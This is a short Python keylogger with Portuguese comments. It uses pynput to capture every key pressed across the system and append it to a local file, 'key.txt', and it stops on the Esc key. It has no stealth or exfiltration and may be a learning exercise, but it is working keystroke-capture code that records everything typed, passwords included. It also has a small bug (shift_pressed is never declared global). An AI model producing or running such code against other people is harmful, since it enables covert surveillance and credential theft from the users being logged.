from pynput.keyboard import Listener, Key

# abre o arquivo onde será escrito as teclas
log_file = open("key.txt", "a")
shift_pressed = False
current_input = ""


def log_keystrokes(key):
    global log_file

    if key == Key.shift:
        shift_pressed = True
        return #Retornar nada

    
    key_str = str(key).replace("'", "")

    if key == Key.esc:  # Verifica se a tecla "Esc" foi pressionada
        log_file.close()  # Fecha o arquivo antes de parar o listener
        return False  # Retorna False para parar o listener
    
    
    # formata as teclas como ENTER e ESPAÇO
    if key == Key.enter:
        log_file.write("\n[ENTER]\n")

    elif key == Key.backspace:
        log_file.write("[APAGADO]")
    
    elif key == Key.tab:
        log_file.write("[TAB]")

    elif key == Key.space:
        log_file.write(" ")

    else:
        log_file.write(key_str)


# Inicia o listener para capturar as teclas 
with Listener(on_press=log_keystrokes) as listener:
    listener.join()